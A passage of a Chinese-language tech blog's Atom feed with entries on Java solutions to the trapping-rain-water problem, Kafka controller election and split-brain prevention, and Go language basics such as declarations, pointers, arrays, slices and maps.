class="line">temp[i] = Math.min(temp[i], max - height[i]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">temp[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">max = Math.max(height[i], max);</span><br><span class="line">&#125;</span><br><span class="line">max = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; temp.length; i++) &#123;</span><br><span class="line">max += temp[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解法二 双指针</span></span><br><span class="line"><span class="comment">// 左右两个指针，指针移动的时候记录左右的最大值l_max和r_max，当l_max小于r_max的时候，说明左侧是低高度，水的深度取决于左边，即左指针向右走并计算接水量，反之则从右侧往左。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">trap</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> l = <span class="number">0</span>, r = height.length - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> l_max = height[<span class="number">0</span>], r_max = height[height.length - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">l_max = Math.max(l_max, height[l]);</span><br><span class="line">r_max = Math.max(r_max, height[r]);</span><br><span class="line"><span class="keyword">if</span> (l_max &lt; r_max) &#123;</span><br><span class="line">res += l_max - height[l];</span><br><span class="line">l++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res += r_max - height[r];</span><br><span class="line">r--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h2><p>end</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;排序&quot;&gt;&lt;a href=&quot;#排序&quot; class=&quot;headerlink&quot; title=&quot;排序&quot;&gt;&lt;/a&gt;排序&lt;/h2&gt;&lt;div class=&quot;tag-plugin image&quot;&gt;&lt;div class=&quot;image-bg&quot;&gt;&lt;img src=&quot;/2023/04/28</summary>
      
    
    
    
    <category term="算法" scheme="http://fireflyingup.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://fireflyingup.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>kafka</title>
    <link href="http://fireflyingup.github.io/2023/04/28/kafka/"/>
    <id>http://fireflyingup.github.io/2023/04/28/kafka/</id>
    <published>2023-04-28T02:09:01.000Z</published>
    <updated>2024-03-12T03:27:31.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h2><h3 id="控制器选举"><a href="#控制器选举" class="headerlink" title="控制器选举"></a>控制器选举</h3><p>控制器是Kafka的核心组件，它的主要作用是在Zookeeper的帮助下管理和协调整个Kafka集群。集群中任意一个Broker都能充当控制器的角色，但在运行过程中，只能有一个Broker成为控制器。</p><blockquote><p>  控制器的作用可以查看文末</p></blockquote><p>控制器选举可以认为是Broker的选举。</p><p>集群中第一个启动的Broker会通过在Zookeeper中创建临时节点/controller来让自己成为控制器，其他Broker启动时也会在zookeeper中创建临时节点，但是发现节点已经存在，所以它们会收到一个异常，意识到控制器已经存在，那么就会在Zookeeper中创建watch对象，便于它们收到控制器变更的通知。</p><p>那么如果控制器由于网络原因与Zookeeper断开连接或者异常退出，那么其他broker通过watch收到控制器变更的通知，就会去尝试创建临时节点/controller，如果有一个Broker创建成功，那么其他broker就会收到创建异常通知，也就意味着集群中已经有了控制器，其他Broker只需创建watch对象即可。</p><p>如果集群中有一个Broker发生异常退出了，那么控制器就会检查这个broker是否有分区的副本leader，如果有那么这个分区就需要一个新的leader，此时控制器就会去遍历其他副本，决定哪一个成为新的leader，同时更新分区的ISR集合。</p><p>如果有一个Broker加入集群中，那么控制器就会通过Broker ID去判断新加入的Broker中是否含有现有分区的副本，如果有，就会从分区副本中去同步数据。</p><h4 id="防止控制器脑裂"><a href="#防止控制器脑裂" class="headerlink" title="防止控制器脑裂"></a>防止控制器脑裂</h4><p>如果控制器所在broker挂掉了或者Full GC停顿时间太长超过zookeeper<code>session timeout</code>出现假死，Kafka集群必须选举出新的控制器，但如果之前被取代的控制器又恢复正常了，它依旧是控制器身份，这样集群就会出现两个控制器，这就是控制器脑裂问题。</p><p>解决方法：</p><p>为了解决Controller脑裂问题，ZooKeeper中还有一个与Controller有关的持久节点/controller_epoch，存放的是一个整形值的epoch number（纪元编号，也称为隔离令牌），集群中每选举一次控制器，就会通过Zookeeper创建一个数值更大的epoch number，如果有broker收到比这个epoch数值小的数据，就会忽略消息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kafka&quot;&gt;&lt;a href=&quot;#Kafka&quot; class=&quot;headerlink&quot; title=&quot;Kafka&quot;&gt;&lt;/a&gt;Kafka&lt;/h2&gt;&lt;h3 id=&quot;控制器选举&quot;&gt;&lt;a href=&quot;#控制器选举&quot; class=&quot;headerlink&quot; title=&quot;控制器</summary>
      
    
    
    
    <category term="kafka" scheme="http://fireflyingup.github.io/categories/kafka/"/>
    
    
    <category term="kafka" scheme="http://fireflyingup.github.io/tags/kafka/"/>
    
  </entry>
  
  <entry>
    <title>go</title>
    <link href="http://fireflyingup.github.io/2023/04/28/Go/"/>
    <id>http://fireflyingup.github.io/2023/04/28/Go/</id>
    <published>2023-04-28T02:09:01.000Z</published>
    <updated>2024-03-11T06:04:26.799Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h3><p>命名规则：</p><p>Go语言中的函数名、变量名、常量名、类型名、语句标号和包名等所有的命名，都遵循一个简单的命名规则：一个名字必须以一个字母（Unicode字母）或下划线开头，后面可以跟任意数量的字母、数字或下划线。</p><p>包本身的名字一般总是用小写字母，命名一般采用驼峰式，而不是用下划线分割。</p><p>关键字：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">break</span>      <span class="keyword">default</span>       <span class="function"><span class="keyword">func</span>     <span class="title">interface</span>   <span class="title">select</span></span></span><br><span class="line"><span class="keyword">case</span>       <span class="keyword">defer</span>         <span class="keyword">go</span>       <span class="keyword">map</span>         <span class="keyword">struct</span></span><br><span class="line"><span class="keyword">chan</span>       <span class="keyword">else</span>          <span class="keyword">goto</span>     <span class="keyword">package</span>     <span class="keyword">switch</span></span><br><span class="line"><span class="keyword">const</span>      <span class="keyword">fallthrough</span>   <span class="keyword">if</span>       <span class="keyword">range</span>       <span class="keyword">type</span></span><br><span class="line"><span class="keyword">continue</span>   <span class="keyword">for</span>           <span class="keyword">import</span>   <span class="keyword">return</span>      <span class="keyword">var</span></span><br><span class="line">  </span><br><span class="line">内建常量: <span class="literal">true</span> <span class="literal">false</span> <span class="literal">iota</span> <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">内建类型: <span class="keyword">int</span> <span class="keyword">int8</span> <span class="keyword">int16</span> <span class="keyword">int32</span> <span class="keyword">int64</span></span><br><span class="line">          <span class="keyword">uint</span> <span class="keyword">uint8</span> <span class="keyword">uint16</span> <span class="keyword">uint32</span> <span class="keyword">uint64</span> <span class="keyword">uintptr</span></span><br><span class="line">          <span class="keyword">float32</span> <span class="keyword">float64</span> <span class="keyword">complex128</span> <span class="keyword">complex64</span></span><br><span class="line">          <span class="keyword">bool</span> <span class="keyword">byte</span> <span class="keyword">rune</span> <span class="keyword">string</span> error</span><br><span class="line"></span><br><span class="line">内建函数: <span class="built_in">make</span> <span class="built_in">len</span> <span class="built_in">cap</span> <span class="built_in">new</span> <span class="built_in">append</span> <span class="built_in">copy</span> <span class="built_in">close</span> <span class="built_in">delete</span></span><br><span class="line">          <span class="built_in">complex</span> <span class="built_in">real</span> <span class="built_in">imag</span></span><br><span class="line">          <span class="built_in">panic</span> <span class="built_in">recover</span></span><br></pre></td></tr></table></figure><p>可见范围：</p><ul><li><p>  如果一个名字是在函数内部定义，那么它就只在函数内部有效。</p></li><li><p>  如果是在函数外部定义，那么将在当前包的所有文件中都可以访问。</p></li><li><p>  如果一个名字是大写字母开头的（译注：必须是在函数外部定义的包级名字；包级函数名本身也是包级名字），那么它将是导出的，也就是说可以被外部的包访问。</p></li></ul><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>四种声明形式：</p><p>var、const、type和func，分别对应变量、常量、类型和函数实体对象的声明。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> my <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">const</span> i = <span class="number">3.14</span></span><br><span class="line"><span class="keyword">var</span> j = i / <span class="number">2</span></span><br><span class="line"><span class="keyword">const</span> a my = <span class="number">1</span></span><br><span class="line">fmt.Println(j, a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 变量名字 类型 = 表达式 <span class="comment">// 去掉表达式会赋默认值，去掉类型会根据表达式来设定类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s <span class="keyword">string</span></span><br><span class="line">fmt.Println(s) <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="comment">// 多变量声明</span></span><br><span class="line"><span class="keyword">var</span> i, j, k <span class="keyword">int</span>                 <span class="comment">// int, int, int</span></span><br><span class="line"><span class="keyword">var</span> b, f, s = <span class="literal">true</span>, <span class="number">2.3</span>, <span class="string">&quot;four&quot;</span> <span class="comment">// bool, float64, string</span></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="keyword">var</span> f, err = os.Open(name) <span class="comment">// os.Open returns a file and an error</span></span><br></pre></td></tr></table></figure><p>简短变量声明</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i := <span class="number">100</span></span><br><span class="line">j, k := <span class="number">200</span>, <span class="number">300</span></span><br><span class="line"></span><br><span class="line">i, j = j, i <span class="comment">// 交换 i 和 j 的值</span></span><br></pre></td></tr></table></figure><p>注意： “:=”是一个变量声明语句，而“=”是一个变量赋值操作。</p><h4 id="new函数"><a href="#new函数" class="headerlink" title="new函数"></a>new函数</h4><p>每次调用new函数都是返回一个新的变量的地址，因此下面两个地址是不同的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p :&#x3D; new(int)</span><br><span class="line">q :&#x3D; new(int)</span><br><span class="line">fmt.Println(p &#x3D;&#x3D; q) &#x2F;&#x2F; &quot;false&quot;</span><br></pre></td></tr></table></figure><p>new函数使用通常相对比较少，因为对于结构体来说，直接用字面量语法创建新变量的方法会更灵活（§4.4.1）。</p><p>由于new只是一个预定义的函数，它并不是一个关键字，因此我们可以将new名字重新定义为别的类型。例如下面的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">delta</span><span class="params">(old, <span class="built_in">new</span> <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> <span class="built_in">new</span> - old &#125;</span><br></pre></td></tr></table></figure><p>由于new被定义为int类型的变量名，因此在delta函数内部是无法使用内置的new函数的。</p><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x := <span class="number">1</span></span><br><span class="line">p := &amp;x         <span class="comment">// p, of type *int, points to x</span></span><br><span class="line">fmt.Println(*p) <span class="comment">// &quot;1&quot;</span></span><br><span class="line">*p = <span class="number">2</span>          <span class="comment">// equivalent to x = 2</span></span><br><span class="line">fmt.Println(x)  <span class="comment">// &quot;2&quot;</span></span><br></pre></td></tr></table></figure><h3 id="变量的生命周期"><a href="#变量的生命周期" class="headerlink" title="变量的生命周期"></a>变量的生命周期</h3><p>对于在包一级声明的变量来说，它们的生命周期和整个程序的运行周期是一致的。</p><p>而相比之下，局部变量的生命周期则是动态的：每次从创建一个新变量的声明语句开始，直到该变量不再被引用为止，然后变量的存储空间可能被回收。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> global *<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> x <span class="keyword">int</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    global = &amp;x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">g</span><span class="params">()</span></span> &#123;</span><br><span class="line">    y := <span class="built_in">new</span>(<span class="keyword">int</span>)</span><br><span class="line">    *y = <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f函数里的x变量必须在<strong>堆上分配</strong>，因为它在函数退出后依然可以通过包一级的global变量找到，虽然它是在函数内部定义的；用Go语言的术语说，<strong>这个x局部变量从函数f中逃逸了</strong>。相反，当g函数返回时，<strong>变量<code>*y</code>将是不可达的，也就是说可以马上被回收的</strong>。因此，<code>*y</code>并没有从函数g中逃逸，编译器可以选择在栈上分配<code>*y</code>的存储空间（译注：也可以选择在堆上分配，然后由Go语言的GC回收这个变量的内存空间），虽然这里用的是new方式。其实在任何时候，你并不需为了编写正确的代码而要考虑变量的逃逸行为，要记住的是，逃逸的变量需要额外分配内存，同时对性能的优化可能会产生细微的影响。</p><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>句法块是由花括弧所包含的一系列语句，就像函数体或循环体花括弧包裹的内容一样。句法块内部声明的名字是无法被外部块访问的。</p><p>对全局的源代码来说，存在一个整体的词法块，称为全局词法块；对于每个包；每个for、if和switch语句，也都有对应词法块；每个switch或select的分支也有独立的词法块；当然也包括显式书写的词法块（花括弧包含的语句）。</p><p>声明语句对应的词法域决定了作用域范围的大小。对于内置的类型、函数和常量，比如int、len和true等是在全局作用域的，因此可以在整个程序中直接使用。任何在函数外部（也就是包级语法域）声明的名字可以在同一个包的任何源文件中访问的。对于导入的包，例如tempconv导入的fmt包，则是对应源文件级的作用域，因此只能在当前的文件中访问导入的fmt包，当前包的其它源文件无法访问在当前源文件导入的包。还有许多声明语句，比如tempconv.CToF函数中的变量c，则是局部作用域的，它只能在函数内部（甚至只能是局部的某些部分）访问。</p><h3 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h3><p>操作符优先级</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*      /      %      &lt;&lt;       &gt;&gt;     &amp;       &amp;^</span><br><span class="line">+      -      |      ^</span><br><span class="line">==     !=     &lt;      &lt;=       &gt;      &gt;=</span><br><span class="line">&amp;&amp;</span><br><span class="line">||</span><br></pre></td></tr></table></figure><p>操作符</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">==    等于</span><br><span class="line">!=    不等于</span><br><span class="line">&lt;     小于</span><br><span class="line">&lt;=    小于等于</span><br><span class="line">&gt;     大于</span><br><span class="line">&gt;=    大于等于</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一元的加法和减法运算符：</span></span><br><span class="line">+      一元加法（无效果）</span><br><span class="line">-      负数</span><br><span class="line"></span><br><span class="line"><span class="comment">// 位操作运算符</span></span><br><span class="line">&amp;      位运算 AND</span><br><span class="line">|      位运算 OR</span><br><span class="line">^      位运算 XOR</span><br><span class="line">&amp;^     位清空（AND NOT）</span><br><span class="line">&lt;&lt;     左移</span><br><span class="line">&gt;&gt;     右移</span><br></pre></td></tr></table></figure><h4 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Go语言同时提供了有符号和无符号类型的整数运算。</span><br><span class="line">这里有<span class="keyword">int8</span>、<span class="keyword">int16</span>、<span class="keyword">int32</span>和<span class="keyword">int64</span>四种截然不同大小的有符号整数类型，分别对应<span class="number">8</span>、<span class="number">16</span>、<span class="number">32</span>、<span class="number">64</span>bit大小的有符号整数，与此对应的是<span class="keyword">uint8</span>、<span class="keyword">uint16</span>、<span class="keyword">uint32</span>和<span class="keyword">uint64</span>四种无符号整数类型。</span><br><span class="line"></span><br><span class="line">其中有符号整数采用<span class="number">2</span>的补码形式表示，也就是最高bit位用来表示符号位，一个n-bit的有符号数的值域是从<span class="number">-2</span>n<span class="number">-1</span>到<span class="number">2</span>n<span class="number">-1</span><span class="number">-1</span>。</span><br><span class="line">无符号整数的所有bit位都用于表示非负数，值域是<span class="number">0</span>到<span class="number">2</span>n<span class="number">-1</span>。</span><br></pre></td></tr></table></figure><p>int和unit的区别：</p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/Go/image-20240306175003414.png"></div></div><h4 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Go语言提供了两种精度的浮点数，<span class="keyword">float32</span>和<span class="keyword">float64</span>。</span><br><span class="line"></span><br><span class="line">常量math.MaxFloat32表示<span class="keyword">float32</span>能表示的最大数值，大约是 <span class="number">3.4e38</span>；对应的math.MaxFloat64常量大约是<span class="number">1.8e308</span>。</span><br><span class="line">它们分别能表示的最小值近似为<span class="number">1.4e-45</span>和<span class="number">4.9e-324</span>。</span><br></pre></td></tr></table></figure><h4 id="复数"><a href="#复数" class="headerlink" title="复数"></a>复数</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Go语言提供了两种精度的复数类型：<span class="keyword">complex64</span>和<span class="keyword">complex128</span>，分别对应<span class="keyword">float32</span>和<span class="keyword">float64</span>两种浮点数精度。</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="keyword">complex128</span> = <span class="built_in">complex</span>(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 1+2i</span></span><br><span class="line"><span class="keyword">var</span> y <span class="keyword">complex128</span> = <span class="built_in">complex</span>(<span class="number">3</span>, <span class="number">4</span>) <span class="comment">// 3+4i</span></span><br><span class="line">fmt.Println(x*y)                 <span class="comment">// &quot;(-5+10i)&quot;</span></span><br><span class="line">fmt.Println(<span class="built_in">real</span>(x*y))           <span class="comment">// &quot;-5&quot;</span></span><br><span class="line">fmt.Println(<span class="built_in">imag</span>(x*y))           <span class="comment">// &quot;10&quot;</span></span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组是一个由固定长度的特定类型元素组成的序列，一个数组可以由零个或多个元素组成。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a [<span class="number">3</span>]<span class="keyword">int</span>  <span class="comment">// 长度为3 默认值都为0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a [<span class="number">3</span>]<span class="keyword">int</span> = [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125; <span class="comment">// 带默认值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125; <span class="comment">// 省略号会自己计算长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组的长度是数组类型的一个组成部分，因此[3]int和[4]int是两种不同的数组类型。数组的长度必须是常量表达式，因为数组的长度需要在编译阶段确定。</span></span><br><span class="line">q := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">q = [<span class="number">4</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125; <span class="comment">// compile error: cannot assign [4]int to [3]int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定index位置</span></span><br><span class="line">symbol := [...]<span class="keyword">string</span>&#123;<span class="number">2</span>: <span class="string">&quot;$&quot;</span>, <span class="number">3</span>: <span class="string">&quot;€&quot;</span>, <span class="number">1</span>: <span class="string">&quot;￡&quot;</span>, <span class="number">0</span>: <span class="string">&quot;￥&quot;</span>&#125;</span><br><span class="line">fmt.Println(symbol) <span class="comment">// [￥ ￡ $ €]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 只有当两个数组的所有元素都是相等的时候数组才是相等的</span></span><br><span class="line">a := [<span class="number">2</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">b := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">c := [<span class="number">2</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">3</span>&#125;</span><br><span class="line">fmt.Println(a == b, a == c, b == c) <span class="comment">// &quot;true false false&quot;</span></span><br><span class="line">d := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">fmt.Println(a == d) <span class="comment">// compile error: cannot compare [2]int == [3]int</span></span><br></pre></td></tr></table></figure><h3 id="切片Slice"><a href="#切片Slice" class="headerlink" title="切片Slice"></a>切片Slice</h3><p>Slice（切片）代表变长的序列，序列中每个元素都有相同的类型。一个slice类型一般写作[]T，其中T代表slice中元素的类型；slice的语法和数组很像，只是没有固定长度而已。</p><p>Slice底层是数组，有len和cap，扩容的时候cap * 2，数据是引用的话改变可能会影响其他的Slice。</p><p>Slice没有==判断，因为如果有的话会去比较里面的各个值，里面的值可能是Slice或者interface。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">fmt.Println(s[<span class="number">1</span>:]) <span class="comment">// [1 2 3 4 5]</span></span><br><span class="line">fmt.Println(s[<span class="number">1</span>:<span class="number">3</span>]) <span class="comment">// [1 2]</span></span><br><span class="line">fmt.Println(s[:<span class="number">3</span>]) <span class="comment">// [0 1 2]</span></span><br><span class="line">fmt.Println(s[:]) <span class="comment">// [0 1 2 3 4 5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试一个slice是否是空的，使用len(s) == 0来判断，而不应该用s == nil来判断。</span></span><br><span class="line"><span class="keyword">var</span> s []<span class="keyword">int</span>    <span class="comment">// len(s) == 0, s == nil</span></span><br><span class="line">s = <span class="literal">nil</span>        <span class="comment">// len(s) == 0, s == nil</span></span><br><span class="line">s = []<span class="keyword">int</span>(<span class="literal">nil</span>) <span class="comment">// len(s) == 0, s == nil</span></span><br><span class="line">s = []<span class="keyword">int</span>&#123;&#125;    <span class="comment">// len(s) == 0, s != nil</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用make创建</span></span><br><span class="line"><span class="built_in">make</span>([]T, <span class="built_in">len</span>)</span><br><span class="line"><span class="built_in">make</span>([]T, <span class="built_in">len</span>, <span class="built_in">cap</span>) <span class="comment">// same as make([]T, cap)[:len]</span></span><br></pre></td></tr></table></figure><p>底层是数组</p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/Go/image-20240306183140048.png"></div></div><p>append后由于没有空间了，会重新申请一个cap为8的数组。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/Go/image-20240306183246288.png"></div></div><p>这样会导致内存的重新分配，所以通常将append的结果在返给原来的变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runes = <span class="built_in">append</span>(runes, r)</span><br></pre></td></tr></table></figure><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Map是一个无序的key/value对的集合，其中所有的key都是不同的，然后通过给定的key可以在常数时间复杂度内检索、更新或删除对应的value。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Map的key必须是支持==比较运算符的数据类型。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过make来创建Map</span></span><br><span class="line">ages := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>) <span class="comment">// mapping from strings to ints</span></span><br><span class="line"><span class="comment">// 普通创建，可以赋值</span></span><br><span class="line">ages := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>&#123;</span><br><span class="line">    <span 